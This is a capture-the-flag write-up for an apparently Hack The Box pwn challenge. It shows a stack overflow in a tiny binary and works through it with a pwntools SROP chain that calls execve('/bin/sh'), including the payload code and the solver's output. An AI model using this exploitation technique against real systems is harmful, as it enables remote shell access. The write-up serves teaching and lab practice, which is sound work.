# Synopsis

Laconic is a easy easy difficulty challenge that features `SROP`.

# Description

Sir Alaric's struggles have plunged him into a deep and overwhelming sadness, leaving him unwilling to speak to anyone. Can you find a way to lift his spirits and bring back his courage?

## Skills Required

- Basic Assembly.

## Skills Learned

- SROP

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
Arch:       amd64
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x42000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

### Protections üõ°Ô∏è

As we can see, all protection are disabled and the binary has `RWX` segments:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | ‚ùå       | Prevents **Buffer Overflows**  |
| **NX**     | ‚ùå     | Disables **code execution** on stack |
| **PIE**    | ‚ùå       | Randomizes the **base address** of the binary |
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The program has no interface, so we head into the disassembly right away.

### Disassembly

Starting with `_start()`:

```c
 ‚ñ∫ 0x43000 <_start>       mov    rdi, 0                 RDI => 0
   0x43007 <_start+7>     mov    rsi, rsp               RSI => 0x7fffffffde50 ‚óÇ‚Äî 1
   0x4300a <_start+10>    sub    rsi, 8                 RSI => 0x7fffffffde48 (0x7fffffffde50 - 0x8)
   0x4300e <_start+14>    mov    rdx, 0x106             RDX => 0x106
   0x43015 <_start+21>    syscall  <SYS_read>
   0x43017 <_start+23>    ret    
 
   0x43018 <_start+24>    pop    rax
   0x43019 <_start+25>    ret   
```

That's the whole binary, we see there is a huge buffer overflow at `SYS_read` because `rdx` reads up to `0x106` bytes. Luckily, we have a `pop rax` gadget, making it easy to perform [SROP](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming). First of all, we need to find a possible `/bin/sh` address.

```gdb 
pwndbg> find 0x43000, 0x43900, "/bin/sh"
0x43238
1 pattern found.
pwndbg> x/s 0x43238
0x43238:  "/bin/sh"
```

Now that we have this, we can craft the `SROP` chain.

```python
# Srop
frame     = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = binsh           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = rop.syscall[0]
```

After crafting the `frame`, we send the payload to trigger the vulnerability and get shell.

```python
pl  = b'w3th4nds'
pl += p64(rop.rax[0])
pl += p64(0xf)
pl += p64(rop.syscall[0])
pl += bytes(frame)
```

```bash
Running solver remotely at 0.0.0.0 1337

[*] Gadgets: 
		pop rax: 0x43018
		syscall: 0x43015
		/bin/sh: 0x43238

[*] Sedning SROP chain..

[+] Done!

Flag -> HTB{XXX}
```
